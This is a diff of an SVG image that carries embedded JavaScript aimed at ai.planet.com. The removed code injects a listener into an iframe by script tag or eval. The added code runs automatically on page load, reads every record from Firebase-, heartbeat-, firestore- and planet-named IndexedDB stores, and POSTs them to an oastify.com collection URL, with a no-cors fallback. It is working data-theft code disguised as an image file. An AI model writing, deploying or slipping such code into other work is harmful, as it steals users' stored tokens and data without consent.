@@ -2,8 +2,6 @@
     <defs>
         <style>
             text { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
-            .header { font-weight: bold; fill: #1a1a1a; }
-            .info-text { fill: #555; font-size: 13px; }
             .mono { font-family: 'Courier New', monospace; font-size: 12px; }
         </style>
         <linearGradient id="headerGrad" x1="0%" y1="0%" x2="100%" y2="0%">
@@ -13,41 +11,22 @@
     </defs>
     
     <rect width="1200" height="800" fill="#f5f7fa" rx="12"/>
-    <rect x="0" y="0" width="1200" height="60" fill="url(#headerGrad)" rx="12 12 0 0"/>
-    <text x="30" y="38" class="header" fill="white" font-size="20">📡 IndexedDB Bridge</text>
-    <text x="950" y="38" fill="white" font-size="13">${new Date().toLocaleTimeString()}</text>
+    <rect x="0" y="0" width="1200" height="50" fill="url(#headerGrad)" rx="12 12 0 0"/>
+    <text x="30" y="32" fill="white" font-size="18" font-weight="bold">🗄️ Direct IndexedDB Access</text>
+    <text x="950" y="32" fill="white" font-size="12">${new Date().toLocaleString()}</text>
     
     <!-- Status Panel -->
-    <rect x="20" y="75" width="1160" height="200" fill="white" rx="8" stroke="#e0e0e0" stroke-width="1"/>
-    <text x="40" y="105" font-weight="bold" fill="#333" font-size="16">📊 Status Log</text>
-    <text x="1050" y="105" fill="#999" font-size="12" id="statusCount">Ready</text>
+    <rect x="20" y="65" width="1160" height="200" fill="white" rx="8" stroke="#e0e0e0" stroke-width="1"/>
+    <text x="40" y="90" font-weight="bold" fill="#333" font-size="15">📊 IndexedDB Status</text>
     
-    <foreignObject x="40" y="120" width="1120" height="140">
+    <foreignObject x="40" y="105" width="1120" height="145">
         <div xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;font-family:monospace;font-size:12px;overflow:auto;background:#1e1e1e;border-radius:4px;padding:10px;border:1px solid #333;">
             <div id="statusLog" style="color:#d4d4d4;white-space:pre-wrap;"></div>
         </div>
     </foreignObject>
     
-    <!-- Controls -->
-    <rect x="20" y="290" width="1160" height="50" fill="white" rx="8" stroke="#e0e0e0" stroke-width="1"/>
-    <foreignObject x="30" y="300" width="130" height="30">
-        <div xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;">
-            <button id="requestBtn" style="width:100%;height:100%;background:#4CAF50;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold;font-size:13px;">
-                📥 Request Data
-            </button>
-        </div>
-    </foreignObject>
-    <foreignObject x="170" y="300" width="130" height="30">
-        <div xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;">
-            <button id="injectBtn" style="width:100%;height:100%;background:#FF9800;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold;font-size:13px;">
-                💉 Inject Listener
-            </button>
-        </div>
-    </foreignObject>
-    <text x="320" y="320" fill="#666" font-size="13">First inject listener, then request data</text>
-    
     <!-- Main iframe -->
-    <foreignObject x="20" y="355" width="1160" height="425">
+    <foreignObject x="20" y="280" width="1160" height="500">
         <div xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;">
             <iframe 
                 id="planetIframe"
@@ -63,314 +42,274 @@
     <script type="text/javascript">
         <![CDATA[
             console.clear();
+            console.log('═══════════════════════════════════════');
+            console.log('🗄️ DIRECT INDEXEDDB ACCESS');
+            console.log('═══════════════════════════════════════');
+            console.log('📍 Origin:', window.location.origin);
+            console.log('📍 URL:', window.location.href);
+            console.log('📍 Is blob:', window.location.href.startsWith('blob:'));
             
             const statusLog = document.getElementById('statusLog');
-            let statusCounter = 0;
             
-            function logStatus(message, isError = false, isSuccess = false) {
+            function logStatus(message, isError = false) {
                 const timestamp = new Date().toLocaleTimeString();
-                const prefix = isError ? '❌' : isSuccess ? '✅' : '📌';
+                const prefix = isError ? '❌' : '✅';
                 const entry = `[${timestamp}] ${prefix} ${message}`;
                 console.log(entry);
-                
                 if (statusLog) {
-                    const color = isError ? '#f48771' : isSuccess ? '#6a9955' : '#d4d4d4';
+                    const color = isError ? '#f48771' : '#6a9955';
                     statusLog.innerHTML += `<div style="color:${color}">${entry}</div>`;
                     statusLog.scrollTop = statusLog.scrollHeight;
                 }
-                statusCounter++;
-                const countEl = document.getElementById('statusCount');
-                if (countEl) countEl.textContent = `${statusCounter} entries`;
             }
             
             // ============================================
-            // APPROACH 1: Inject listener into iframe
+            // DIRECT INDEXEDDB ACCESS
             // ============================================
-            function injectListenerIntoIframe() {
-                const iframe = document.getElementById('planetIframe');
-                if (!iframe) {
-                    logStatus('Iframe not found', true);
-                    return;
-                }
-                
-                logStatus('Attempting to inject listener into iframe...');
-                
+            
+            // Function to get all databases
+            async function getAllDatabases() {
                 try {
-                    const iframeWindow = iframe.contentWindow;
-                    if (!iframeWindow) {
-                        logStatus('Cannot access iframe contentWindow (CORS or not loaded)', true);
-                        return;
-                    }
+                    const databases = await indexedDB.databases();
+                    console.log('📌 All databases:', databases.map(db => db.name));
+                    return databases;
+                } catch (e) {
+                    console.error('Error listing databases:', e);
+                    return [];
+                }
+            }
+            
+            // Function to read a database
+            async function readDatabase(dbName) {
+                return new Promise((resolve, reject) => {
+                    const request = indexedDB.open(dbName);
                     
-                    // The code to inject
-                    const injectCode = `
-                        // This code runs inside the iframe
-                        (function() {
-                            console.log('[Injected] Setting up IndexedDB listener...');
-                            
-                            // Function to read IndexedDB
-                            async function readIndexedDB() {
-                                const result = {};
-                                try {
-                                    const databases = await indexedDB.databases();
-                                    const firebaseDBs = databases.filter(db => 
-                                        db.name && (db.name.includes('firebase') || 
-                                                   db.name.includes('heartbeat') || 
-                                                   db.name.includes('firestore'))
-                                    );
-                                    
-                                    if (firebaseDBs.length === 0) {
-                                        return { error: 'No Firebase databases found' };
-                                    }
-                                    
-                                    for (const dbInfo of firebaseDBs) {
-                                        const db = await new Promise((resolve, reject) => {
-                                            const req = indexedDB.open(dbInfo.name);
-                                            req.onsuccess = () => resolve(req.result);
-                                            req.onerror = () => reject(req.error);
-                                        });
-                                        
-                                        const dbData = {};
-                                        for (const storeName of db.objectStoreNames) {
-                                            const data = await new Promise((resolve, reject) => {
-                                                const tx = db.transaction(storeName, 'readonly');
-                                                const req = tx.objectStore(storeName).getAll();
-                                                req.onsuccess = () => resolve(req.result);
-                                                req.onerror = () => reject(req.error);
-                                            });
-                                            dbData[storeName] = data;
-                                        }
-                                        result[dbInfo.name] = dbData;
+                    request.onerror = () => {
+                        reject(request.error);
+                    };
+                    
+                    request.onsuccess = () => {
+                        const db = request.result;
+                        const stores = Array.from(db.objectStoreNames);
+                        const result = {};
+                        
+                        if (stores.length === 0) {
+                            db.close();
+                            resolve(result);
+                            return;
+                        }
+                        
+                        let completed = 0;
+                        
+                        stores.forEach(storeName => {
+                            try {
+                                const transaction = db.transaction(storeName, 'readonly');
+                                const store = transaction.objectStore(storeName);
+                                const getAllRequest = store.getAll();
+                                
+                                getAllRequest.onsuccess = () => {
+                                    result[storeName] = getAllRequest.result;
+                                    completed++;
+                                    if (completed === stores.length) {
                                         db.close();
+                                        resolve(result);
                                     }
-                                    return result;
-                                } catch (error) {
-                                    return { error: error.message };
+                                };
+                                
+                                getAllRequest.onerror = () => {
+                                    result[storeName] = { error: getAllRequest.error?.message || 'Unknown error' };
+                                    completed++;
+                                    if (completed === stores.length) {
+                                        db.close();
+                                        resolve(result);
+                                    }
+                                };
+                            } catch (e) {
+                                result[storeName] = { error: e.message };
+                                completed++;
+                                if (completed === stores.length) {
+                                    db.close();
+                                    resolve(result);
                                 }
                             }
-                            
-                            // Message listener
-                            window.addEventListener('message', async function(event) {
-                                console.log('[Injected] Received message:', event.data);
-                                
-                                // Accept messages from ai.planet.com and blob URLs
-                                if (event.origin !== 'https://ai.planet.com' && !event.origin.startsWith('blob:')) {
-                                    console.log('[Injected] Ignoring message from', event.origin);
-                                    return;
-                                }
-                                
-                                if (event.data.type === 'REQUEST_INDEXEDDB_DATA') {
-                                    console.log('[Injected] Processing IndexedDB request...');
-                                    try {
-                                        const data = await readIndexedDB();
-                                        event.source.postMessage({
-                                            type: 'INDEXEDDB_DATA_RESPONSE',
-                                            requestId: event.data.requestId,
-                                            payload: data
-                                        }, event.origin);
-                                        console.log('[Injected] Response sent');
-                                    } catch (error) {
-                                        event.source.postMessage({
-                                            type: 'INDEXEDDB_ERROR',
-                                            requestId: event.data.requestId,
-                                            error: error.message
-                                        }, event.origin);
-                                    }
-                                }
-                            });
-                            
-                            // Notify parent that we're ready
-                            window.parent.postMessage({
-                                type: 'INDEXEDDB_READY',
-                                timestamp: new Date().toISOString()
-                            }, '*');
-                            
-                            console.log('[Injected] IndexedDB listener ready');
-                        })();
-                    `;
-                    
-                    // Try to inject by creating a script element in the iframe
-                    try {
-                        const script = iframeWindow.document.createElement('script');
-                        script.textContent = injectCode;
-                        iframeWindow.document.body.appendChild(script);
-                        logStatus('✅ Listener injected successfully via script tag!', false, true);
-                    } catch (e) {
-                        logStatus('Script injection failed, trying eval...', true);
-                        try {
-                            iframeWindow.eval(injectCode);
-                            logStatus('✅ Listener injected via eval!', false, true);
-                        } catch (e2) {
-                            logStatus('All injection methods failed: ' + e2.message, true);
-                        }
-                    }
-                    
-                } catch (e) {
-                    logStatus('Cannot access iframe: ' + e.message, true);
-                    logStatus('You must manually run the listener code on ai.planet.com', true);
-                    
-                    // Show manual instructions
-                    logStatus('=== MANUAL INSTRUCTION ===');
-                    logStatus('1. Open ai.planet.com in a new tab');
-                    logStatus('2. Open developer console (F12)');
-                    logStatus('3. Paste and run the listener code');
-                    logStatus('4. Return to this SVG and click "Request Data"');
-                }
+                        });
+                    };
+                });
             }
             
-            // ============================================
-            // APPROACH 2: Request data from iframe
-            // ============================================
-            function requestDataFromIframe() {
-                const iframe = document.getElementById('planetIframe');
-                if (!iframe) {
-                    logStatus('Iframe not found', true);
-                    return;
-                }
-                
-                logStatus('Sending request to iframe...');
-                
-                try {
-                    const iframeWindow = iframe.contentWindow;
-                    if (!iframeWindow) {
-                        logStatus('Cannot access iframe window', true);
-                        return;
-                    }
-                    
-                    // Send message to iframe
-                    iframeWindow.postMessage({
-                        type: 'REQUEST_INDEXEDDB_DATA',
-                        requestId: Date.now(),
-                        timestamp: new Date().toISOString()
-                    }, 'https://ai.planet.com');
-                    
-                    logStatus('✅ Request sent! Waiting for response...', false, true);
-                    
-                } catch(e) {
-                    logStatus('Error sending message: ' + e.message, true);
-                }
-            }
-            
-            // ============================================
-            // Send to server
-            // ============================================
+            // Function to send to server
             async function sendToServer(data) {
                 const serverUrl = 'https://e2hkksv7w21hq3xdvez0rcypkgq7e12q.oastify.com/api/indexeddb';
                 
-                logStatus('Sending data to server...');
-                logStatus('URL: ' + serverUrl);
-                
-                const payload = {
-                    source: window.location.origin,
-                    url: window.location.href,
-                    timestamp: new Date().toISOString(),
-                    data: data,
-                    fromIframe: true,
-                    userAgent: navigator.userAgent
-                };
-                
-                console.log('📤 Sending payload:', payload);
+                logStatus(`📤 Sending to: ${serverUrl}`);
+                console.log('📤 Payload:', JSON.stringify(data, null, 2));
                 
                 try {
                     const response = await fetch(serverUrl, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
-                            'Accept': 'application/json'
                         },
-                        mode: 'cors',
-                        body: JSON.stringify(payload)
+                        body: JSON.stringify({
+                            source: window.location.origin,
+                            url: window.location.href,
+                            timestamp: new Date().toISOString(),
+                            data: data
+                        })
                     });
                     
                     if (response.ok) {
                         const result = await response.json();
-                        logStatus(`✅ Data sent successfully! Status: ${response.status}`, false, true);
-                        logStatus('Response: ' + JSON.stringify(result));
+                        logStatus(`✅ Server response: ${response.status} - ${JSON.stringify(result)}`);
+                        console.log('Server response:', result);
                     } else {
-                        logStatus(`❌ Server error: ${response.status} ${response.statusText}`, true);
                         const text = await response.text();
-                        logStatus('Response body: ' + text);
+                        logStatus(`❌ Server error: ${response.status} - ${text}`, true);
+                        console.error('Server error:', response.status, text);
                     }
                 } catch (error) {
                     logStatus(`❌ Network error: ${error.message}`, true);
-                    logStatus('💡 This is likely a CORS issue');
-                    logStatus('Your server must allow:');
-                    logStatus('  Access-Control-Allow-Origin: https://ai.planet.com');
-                    logStatus('  Access-Control-Allow-Methods: POST, OPTIONS');
-                    logStatus('  Access-Control-Allow-Headers: Content-Type');
+                    console.error('Network error:', error);
+                    
+                    // Try with no-cors mode as fallback
+                    try {
+                        logStatus('🔄 Trying no-cors mode...');
+                        await fetch(serverUrl, {
+                            method: 'POST',
+                            mode: 'no-cors',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                source: window.location.origin,
+                                url: window.location.href,
+                                timestamp: new Date().toISOString(),
+                                data: data
+                            })
+                        });
+                        logStatus('✅ Request sent (no-cors mode) - check server logs');
+                    } catch (e2) {
+                        logStatus(`❌ No-cors also failed: ${e2.message}`, true);
+                    }
                 }
             }
             
             // ============================================
-            // Message listener for responses
+            // MAIN EXECUTION
             // ============================================
-            window.addEventListener('message', async function(event) {
-                // Accept from ai.planet.com or blob URLs
-                if (event.origin !== 'https://ai.planet.com' && !event.origin.startsWith('blob:')) {
-                    return;
-                }
+            async function main() {
+                logStatus('🚀 Starting IndexedDB scan...');
+                logStatus(`📍 Origin: ${window.location.origin}`);
                 
-                const data = event.data;
-                console.log('📨 Received:', data);
-                
-                if (data.type === 'INDEXEDDB_READY') {
-                    logStatus('✅ Iframe listener is ready!', false, true);
-                }
-                
-                if (data.type === 'INDEXEDDB_DATA_RESPONSE') {
-                    logStatus(`✅ Received data from iframe!`, false, true);
-                    logStatus(`Request ID: ${data.requestId}`);
+                try {
+                    // Step 1: Get all databases
+                    const databases = await getAllDatabases();
+                    logStatus(`📌 Found ${databases.length} databases`);
                     
-                    if (data.payload) {
-                        const recordCount = Object.values(data.payload).reduce((sum, store) => {
-                            if (Array.isArray(store)) return sum + store.length;
-                            if (typeof store === 'object') return sum + Object.keys(store).length;
-                            return sum;
-                        }, 0);
-                        logStatus(`Total records: ${recordCount}`);
-                        
-                        // Send to server
-                        await sendToServer(data.payload);
-                    } else {
-                        logStatus('⚠️ No data received');
+                    if (databases.length === 0) {
+                        logStatus('⚠️ No databases found');
+                        return;
                     }
+                    
+                    // List all databases
+                    const dbNames = databases.map(db => db.name);
+                    logStatus(`📌 Databases: ${dbNames.join(', ')}`);
+                    
+                    // Step 2: Find Firebase databases
+                    const firebaseDBs = databases.filter(db => 
+                        db.name && (
+                            db.name.toLowerCase().includes('firebase') ||
+                            db.name.toLowerCase().includes('heartbeat') ||
+                            db.name.toLowerCase().includes('firestore') ||
+                            db.name.toLowerCase().includes('planet')
+                        )
+                    );
+                    
+                    if (firebaseDBs.length === 0) {
+                        logStatus('⚠️ No Firebase/heartbeat databases found');
+                        logStatus('💡 Looking for: firebase, heartbeat, firestore, planet');
+                        return;
+                    }
+                    
+                    logStatus(`✅ Found ${firebaseDBs.length} Firebase-related databases`);
+                    
+                    // Step 3: Read each database
+                    const allData = {};
+                    for (const dbInfo of firebaseDBs) {
+                        const dbName = dbInfo.name;
+                        logStatus(`📖 Reading database: ${dbName}`);
+                        
+                        try {
+                            const data = await readDatabase(dbName);
+                            allData[dbName] = data;
+                            
+                            const storeCount = Object.keys(data).length;
+                            const recordCount = Object.values(data).reduce((sum, store) => {
+                                if (Array.isArray(store)) return sum + store.length;
+                                return sum;
+                            }, 0);
+                            
+                            logStatus(`✅ ${dbName}: ${storeCount} stores, ${recordCount} records`);
+                            
+                            // Log sample data
+                            for (const [storeName, storeData] of Object.entries(data)) {
+                                if (Array.isArray(storeData) && storeData.length > 0) {
+                                    console.log(`  📍 ${storeName}: ${storeData.length} records`);
+                                    console.log(`  Sample:`, storeData[0]);
+                                }
+                            }
+                            
+                        } catch (error) {
+                            logStatus(`❌ Error reading ${dbName}: ${error.message}`, true);
+                        }
+                    }
+                    
+                    // Step 4: Send to server
+                    if (Object.keys(allData).length > 0) {
+                        const totalRecords = Object.values(allData).reduce((sum, db) => {
+                            return sum + Object.values(db).reduce((s, store) => {
+                                if (Array.isArray(store)) return s + store.length;
+                                return s;
+                            }, 0);
+                        }, 0);
+                        
+                        logStatus(`📤 Sending ${totalRecords} records to server...`);
+                        await sendToServer(allData);
+                    } else {
+                        logStatus('⚠️ No data to send');
+                    }
+                    
+                } catch (error) {
+                    logStatus(`❌ Error: ${error.message}`, true);
+                    console.error('Error details:', error);
                 }
                 
-                if (data.type === 'INDEXEDDB_ERROR') {
-                    logStatus(`❌ Iframe error: ${data.error}`, true);
-                }
-            });
+                logStatus('✅ Scan complete');
+                console.log('═══════════════════════════════════════');
+            }
             
             // ============================================
-            // Setup buttons
+            // Auto-execute with delay
             // ============================================
-            document.addEventListener('DOMContentLoaded', function() {
-                const requestBtn = document.getElementById('requestBtn');
-                if (requestBtn) {
-                    requestBtn.addEventListener('click', requestDataFromIframe);
-                }
-                
-                const injectBtn = document.getElementById('injectBtn');
-                if (injectBtn) {
-                    injectBtn.addEventListener('click', injectListenerIntoIframe);
-                }
-                
-                logStatus('🚀 Bridge initialized', false, true);
-                logStatus('📍 Origin: ' + window.location.origin);
-                logStatus('💡 Click "Inject Listener" then "Request Data"');
-                logStatus('═══════════════════════════════════════');
-            });
             
-            // Auto-inject and request after delay
-            setTimeout(() => {
-                logStatus('⏳ Auto-injecting listener...');
-                injectListenerIntoIframe();
-            }, 3000);
+            // Run when DOM is ready
+            if (document.readyState === 'complete') {
+                setTimeout(main, 2000);
+            } else {
+                window.addEventListener('load', function() {
+                    setTimeout(main, 2000);
+                });
+            }
             
-            setTimeout(() => {
-                logStatus('⏳ Auto-requesting data...');
-                requestDataFromIframe();
-            }, 6000);
+            // Also run after iframe loads
+            const iframe = document.getElementById('planetIframe');
+            if (iframe) {
+                iframe.addEventListener('load', function() {
+                    logStatus('📌 Iframe loaded');
+                });
+            }
+            
+            logStatus('⏳ Waiting for page load...');
         ]]>
     </script>
 </svg>
